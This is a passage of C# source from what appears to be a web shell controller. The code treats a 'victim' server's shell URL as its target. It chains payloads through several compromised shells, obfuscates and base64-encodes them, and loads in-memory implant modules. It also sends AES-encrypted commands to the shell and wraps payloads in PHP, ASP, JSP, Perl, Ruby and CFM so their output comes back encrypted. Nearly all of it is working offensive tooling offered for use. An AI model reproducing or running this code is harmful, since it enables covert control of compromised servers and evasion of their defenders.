                return szPayload;
            }
            else
            {
                MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }

        private async Task<(stShellConfig config, string? szURL, string? szComet, List<string>? lsSplitter)> fnDriftingComet(List<stShellConfig> lsConfig, string? szPayload)
        {
            if (string.IsNullOrEmpty(szPayload))
                throw new Exception("Payload is null or empty");

            string szCurrentPayload = szPayload;

            stShellConfig finalTargetConfig = new stShellConfig();
            string szFinalURL = string.Empty;

            List<string> lsSplitter = new List<string>();

            for (int i = 0; i < lsConfig.Count; i++)
            {
                var config = lsConfig[i];
                string szPassword = config.szPassword;

                string szSplitter = clsEzData.fnszGenerateRandomStr();
                string szCurrentTemplate = await fnGetPayload(config, "comet", szSplitter);

                if (string.IsNullOrEmpty(szCurrentTemplate))
                    throw new Exception("Comet payload is null or empty");

                string szNextUrl = i == 0 ? m_victim.ShellURL : lsConfig[i - 1].szUrl;

                string szMergedComet = clsTamper.fnMergePayloadToOne(
                    config,
                    szCurrentTemplate,
                    new string[] {
                        clsEzData.fnszStre2b64(szNextUrl),
                        clsEzData.fnszStre2b64(Uri.UnescapeDataString(szCurrentPayload))
                    },
                    config.language
                );

                string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod)
                    .Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet))
                    .Replace("[ENCODING]", config.szEncoding);

                if (config.bEHEnable)
                {
                    szCurrentPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, szCurrentLayer, JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));
                }
                else
                {
                    szCurrentPayload = $"{szPassword}={szCurrentLayer}";
                }

                finalTargetConfig = config;
                szFinalURL = config.szUrl;
                lsSplitter.Add(szSplitter);
            }

            return (finalTargetConfig, szFinalURL, szCurrentPayload, lsSplitter);
        }

        private byte[]? fnGetNebulaPulsar()
        {
            string? szLang = Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage);
            if (string.IsNullOrEmpty(szLang))
                return null;
            
            bool bIsJava = m_victim.ShellLanguage == enLanguage.JSP || m_victim.ShellLanguage == enLanguage.JSPX || m_victim.ShellLanguage == enLanguage.CFM;

            string szPath = Path.Combine(Application.StartupPath, "Payload", szLang, "NebulaPulsar", "DarkMatter", "NebulaPulsar." + (bIsJava ? "class" : "dll"));
            if (!Path.Exists(szPath))
                return null;

            return File.ReadAllBytes(szPath);
        }

        /// <summary>
        /// Payload module of NebulaPulsar
        /// </summary>
        /// <returns></returns>
        private byte[]? fnGetDarkMatter(string szName)
        {
            string? szLang = Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage);
            if (string.IsNullOrEmpty(szLang))
                return null;

            bool bIsJava = m_victim.ShellLanguage == enLanguage.JSP || m_victim.ShellLanguage == enLanguage.JSPX || m_victim.ShellLanguage == enLanguage.CFM;
            
            string szPath = Path.Combine(Application.StartupPath, "Payload", szLang, "NebulaPulsar", "DarkMatter", szName + "." + (bIsJava ? "class" : "dll"));
            if (!Path.Exists(szPath))
                throw new Exception("File not found: " + szPath);

            return File.ReadAllBytes(szPath);
        }

        private async Task<bool> fnUnloadNebulaPulsar()
        {
            string szParamStr = $"action=UNLOAD";
            byte[] abParamStr = Encoding.UTF8.GetBytes(szParamStr);

            byte[] abPayload = new byte[0];
            int nLength = 0;
            byte[] abLength = BitConverter.GetBytes(nLength);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(abLength);

            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write(abLength, 0, abLength.Length);
                    ms.Write(abPayload, 0, abPayload.Length);
                    ms.Write(abParamStr, 0, abParamStr.Length);

                    byte[] abRawPayload = ms.ToArray();
                    byte[] abEncryptedPayload = clsCrypto.fnAesEncrypt(abRawPayload, abPayload);

                    using (var content = new ByteArrayContent(abEncryptedPayload))
                    {
                        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
                        {
                            CharSet = m_victim.ShellEncoding,
                        };

                        HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
                        resp.EnsureSuccessStatusCode();

                        byte[] abResp = await resp.Content.ReadAsByteArrayAsync();

                        string szResp = Encoding.UTF8.GetString(abResp);

                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                return true;
            }
        }

        private static string fnWrapPHP(string szOriginalPayload, string szEncryptor)
        {
            if (szEncryptor == "*")
                return szOriginalPayload;

            string szHeader =
                "\r\n" +
                (string.IsNullOrEmpty(szEncryptor) ?
                "function Encrypt($data) {\r\n" +
                "    // TODO: Add PHP encryption logic here\r\n" +
                "    return $data;\r\n" +
                "}" : szEncryptor) +
                "\r\n" +
                "ob_start();\r\n\r\n";

            string szFooter =
                "\r\n\r\n$globalStringOutput = ob_get_clean();\r\n" +
                "echo Encrypt($globalStringOutput);\r\n" +
                "";

            string szProcessed = szOriginalPayload.Replace("<?php", "").Replace("?>", "");

            return $"{szHeader}{szProcessed}{szFooter}";
        }

        private static string fnWrapVBScript(string szOriginalPayload, string szEncryptor)
        {
            string szProcessed = szOriginalPayload;
            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);

            if (szEncryptor == "*")
                return szProcessed;

            string szHeader =
                "\r\n" +
                "Dim globalStringOutput\r\n" +
                "Sub Echo(s)\r\n" +
                "    globalStringOutput = globalStringOutput & s\r\n" +
                "End Sub\r\n\r\n" +

                (string.IsNullOrEmpty(szEncryptor) ?
                "Function Encrypt(s)\r\n" +
                "    ' TODO: Add VBScript encryption logic here\r\n" +
                "    Encrypt = s\r\n" +
                "End Function" : szEncryptor) + "\r\n\r\n";

            string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput))\r\n";

            return $"{szHeader}{szProcessed}{szFooter}";
        }

        private static string fnWrapCSharp(string szOriginalPayload, string szEncryptor)
        {
            string szProcessed = szOriginalPayload;
            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);

            if (szEncryptor == "*")
                return szProcessed;

            string szHeader =
                "\r\n" +
                (string.IsNullOrEmpty(szEncryptor) ?
                "public static string Encrypt(string data)\r\n" +
                "{\r\n" +
                "    // TODO: Add C# encryption logic here\r\n" +
                "    return data;\r\n" +
                "}" : szEncryptor) + "\r\n\r\n" +
                "// Setup buffer\r\n" +
                "System.Text.StringBuilder sbOutput = new System.Text.StringBuilder();\r\n" +
                "Action<string> Echo = (s) => sbOutput.Append(s);\r\n\r\n";

            string szFooter = "\r\n\r\nResponse.Write(Encrypt(sbOutput.ToString()));\r\n";

            return $"{szHeader}{szProcessed}{szFooter}";
        }

        private static string fnWrapJScript(string szOriginalPayload, string szEncryptor)
        {
            string szProcessed = szOriginalPayload;
            szProcessed = Regex.Replace(szProcessed, @"System\.Web\.HttpContext\.Current\.Response\.Write", "Echo", RegexOptions.IgnoreCase);
            szProcessed = Regex.Replace(szProcessed, @"Response\.Write", "Echo", RegexOptions.IgnoreCase);
            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);

            if (szEncryptor == "*")
                return szProcessed;

            string szHeader =
                "\r\n" +
                "var globalStringOutput = '';\r\n" +
                "function Echo(s) {\r\n" +
                "    globalStringOutput += s;\r\n" +
                "}\r\n\r\n" +

                (string.IsNullOrEmpty(szEncryptor) ?
                "function Encrypt(s) {\r\n" +
                "    // TODO: Add JScript encryption logic here\r\n" +
                "    return s;\r\n" +
                "}" : szEncryptor) + "\r\n\r\n";

            string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput));\r\n";

            return $"{szHeader}{szProcessed}{szFooter}";
        }

        private static string fnWrapPerl(string szOriginalPayload, string szEncryptor)
        {
            string szProcessed = szOriginalPayload;

            if (szEncryptor == "*")
                return szProcessed;

            string szHeader =
                "\r\n" +
                (string.IsNullOrEmpty(szEncryptor) ?
                "sub Encrypt {\r\n" +
                "    my ($data) = @_;\r\n" +
                "    return $data;\r\n" +
                "}" : szEncryptor) + "\r\n\r\n" +
                "my $globalStringOutput = '';\r\n" +
                "my $oldout;\r\n" +
                "sub start_capture {\r\n" +
                "    open($oldout, '>&', STDOUT);\r\n" +
                "    close(STDOUT);\r\n" +
                "    open(STDOUT, '>', \\$globalStringOutput);\r\n" +
                "}\r\n\r\n" +
                "start_capture();\r\n";

            string szFooter =
                "\r\n\r\n" +
                "# Restore STDOUT and output encrypted data\r\n" +
                "close(STDOUT);\r\n" +
                "open(STDOUT, '>&', $oldout);\r\n" +
                "print Encrypt($globalStringOutput);\r\n";

            return szHeader + szProcessed + szFooter;
        }

        private static string fnWrapRuby(string szOriginalPayload, string szEncryptor)
        {
            string szProcessed = szOriginalPayload;
            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "print", RegexOptions.IgnoreCase);

            if (szEncryptor == "*")
                return szProcessed;

            string szHeader =
                "\r\n" +
                "require 'stringio';\r\n" +
                (string.IsNullOrEmpty(szEncryptor) ?
                "def encrypt(data)\r\n" +
                "  # TODO: Add Ruby encryption logic here\r\n" +
                "  return data\r\n" +
                "end" : szEncryptor) + "\r\n\r\n" +
                "old_stdout = $stdout;\r\n" +
                "$stdout = StringIO.new;\r\n\r\n";

            string szFooter =
                "\r\n\r\n" +
                "globalStringOutput = $stdout.string;\r\n" +
                "$stdout = old_stdout;\r\n" +
                "print encrypt(globalStringOutput);\r\n";

            return $"{szHeader}{szProcessed}{szFooter}";
        }

        private static string fnWrapJSP(string szOriginalPayload, string szEncryptor)
        {
            string szProcessed = szOriginalPayload;
            szProcessed = Regex.Replace(szProcessed, @"\becho\s*\(", "Echo(", RegexOptions.IgnoreCase);
            szProcessed = Regex.Replace(szProcessed, @"\becho[ \t]+", "Echo ", RegexOptions.IgnoreCase);

            if (szEncryptor == "*")
                return szProcessed;

            string szHeader =
                "\r\n" +
                (string.IsNullOrEmpty(szEncryptor) ?
                "function Encrypt(data) {\r\n" +
                "    // TODO: Add Java/JS encryption logic here\r\n" +
                "    return data;\r\n" +
                "}" : szEncryptor) + "\r\n\r\n" +
                "var bos = new java.io.ByteArrayOutputStream();\r\n" +
                "function Echo(s) {\r\n" +
                "    if (s != null) {\r\n" +
                "        var bytes = String(s).getBytes('UTF-8');\r\n" +
                "        bos.write(bytes, 0, bytes.length);\r\n" +
                "    }\r\n" +
                "}\r\n\r\n";

            string szFooter =
                "\r\n\r\n" +
                "var writer = response.getWriter();\r\n" +
                "var encryptedData = Encrypt(bos.toString('UTF-8'));\r\n" +
                "writer.print(encryptedData);\r\n" +
                "writer.flush();\r\n" +
                ";null;\r\n";

            return $"{szHeader}{szProcessed}{szFooter}";
        }

        private static string fnWrapCFM(string szOriginalPayload, string szEncryptor)
        {
            string szHeader = "[ ";
            string szFooter = " ]";

            string szProcessed = szOriginalPayload;
            szProcessed = Regex.Replace(szProcessed, @"\bwriteOutput\s*\(", "writeOutput(", RegexOptions.IgnoreCase);
            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\s*\(", "writeOutput(", RegexOptions.IgnoreCase);

            szProcessed = Regex.Replace(szProcessed, @"\b([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*([^;?=\r\n]+)", "($1 = $2)", RegexOptions.IgnoreCase);

            szProcessed = szProcessed.Replace("\r", " ").Replace("\n", " ");
            szProcessed = szProcessed.Replace(";", " , ");

            szProcessed = Regex.Replace(szProcessed, @"(\s*,\s*)+", " , ");
            szProcessed = Regex.Replace(szProcessed, @"[ \t]+", " ");
            szProcessed = szProcessed.Trim();

            if (szProcessed.EndsWith(","))
                szProcessed = szProcessed.Substring(0, szProcessed.Length - 1).Trim();

            if (szProcessed.EndsWith(", "))
                szProcessed = szProcessed.Substring(0, szProcessed.Length - 2).Trim();

            return $"{szHeader}{szProcessed}{szFooter}";
        }
    }
}